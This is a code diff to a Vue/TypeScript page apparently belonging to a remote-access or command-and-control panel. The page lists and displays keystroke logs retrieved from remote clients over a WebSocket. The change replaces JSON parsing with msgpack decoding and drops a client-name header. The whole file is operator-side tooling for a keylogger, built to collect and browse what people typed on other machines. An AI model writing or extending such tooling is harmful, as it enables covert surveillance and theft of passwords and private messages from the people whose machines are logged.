@@ -1,8 +1,7 @@
 <script setup lang="ts">
 import { ref, computed, onMounted, onUnmounted, nextTick, watch } from "vue";
 import { useRoute, useRouter } from "vue-router";
-import { clientApi } from "@/api/client";
-import type { Client } from "@/api/types";
+import { decode } from "@msgpack/msgpack";
 
 const route = useRoute();
 const router = useRouter();
@@ -19,8 +18,6 @@ interface LogEntry {
   text: string;
 }
 
-const client = ref<Client | null>(null);
-const loading = ref(true);
 const connected = ref(false);
 const error = ref("");
 const logFiles = ref<KeylogFile[]>([]);
@@ -44,13 +41,12 @@ const filteredEntries = computed(() => {
   return logContent.value.filter((e) => e.text.toLowerCase().includes(q) || e.timestamp.toLowerCase().includes(q));
 });
 
-async function fetchClient() {
-  try {
-    const res = await clientApi.list({ clientId });
-    client.value = res.items.find((c) => c.id === clientId) || null;
-  } catch { /* silent */ } finally {
-    loading.value = false;
-  }
+function decodeMsg(data: ArrayBuffer | string): any {
+  if (typeof data === "string") return JSON.parse(data);
+  const bytes = new Uint8Array(data);
+  try { return decode(bytes); } catch {}
+  try { return JSON.parse(new TextDecoder().decode(bytes)); } catch {}
+  return null;
 }
 
 function connect() {
@@ -66,21 +62,19 @@ function connect() {
     ws.onclose = () => { connected.value = false; };
     ws.onerror = () => { error.value = "Connection failed"; connected.value = false; };
     ws.onmessage = (ev) => {
-      try {
-        const raw = typeof ev.data === "string" ? ev.data : new TextDecoder().decode(ev.data);
-        const data = JSON.parse(raw);
-        if (data.type === "keylog_file_list" && data.files) {
-          logFiles.value = data.files;
-        } else if (data.type === "keylog_retrieve_result" && data.content !== undefined) {
-          logRaw.value = data.content;
-          logContent.value = parseLogEntries(data.content);
-          contentLoading.value = false;
-          if (autoScroll.value) scrollToBottom();
-        } else if (data.type === "command_result" && data.ok === false) {
-          error.value = data.message || "Command failed";
-          contentLoading.value = false;
-        }
-      } catch { /* silent */ }
+      const data = decodeMsg(ev.data);
+      if (!data) return;
+      if (data.type === "keylog_file_list" && data.files) {
+        logFiles.value = data.files;
+      } else if (data.type === "keylog_retrieve_result" && data.content !== undefined) {
+        logRaw.value = data.content;
+        logContent.value = parseLogEntries(data.content);
+        contentLoading.value = false;
+        if (autoScroll.value) scrollToBottom();
+      } else if (data.type === "command_result" && data.ok === false) {
+        error.value = data.message || "Command failed";
+        contentLoading.value = false;
+      }
     };
   } catch { error.value = "Failed to connect"; }
 }
@@ -155,8 +149,7 @@ watch(autoScroll, (val) => {
   if (val) scrollToBottom();
 });
 
-onMounted(async () => {
-  await fetchClient();
+onMounted(() => {
   connect();
 });
 
@@ -169,11 +162,7 @@ onUnmounted(() => { ws?.close(); });
       <button @click="router.back()" class="text-slate-400 hover:text-slate-200 transition-colors">
         <i class="fa-solid fa-arrow-left"></i>
       </button>
-      <div v-if="loading" class="text-sm text-slate-400">Loading...</div>
-      <template v-else-if="client">
-        <h1 class="text-lg font-semibold text-slate-100">Keylogger</h1>
-        <span class="text-sm text-slate-400">{{ client.nickname || client.host }}</span>
-      </template>
+      <h1 class="text-lg font-semibold text-slate-100">Keylogger</h1>
       <div class="ml-auto flex items-center gap-2">
         <button @click="refreshFiles" :disabled="!connected" class="px-2.5 py-1.5 text-xs rounded bg-slate-900 border border-slate-800 text-slate-300 hover:bg-slate-800 disabled:opacity-40 transition-colors">
           <i class="fa-solid fa-rotate-right mr-1"></i>Refresh
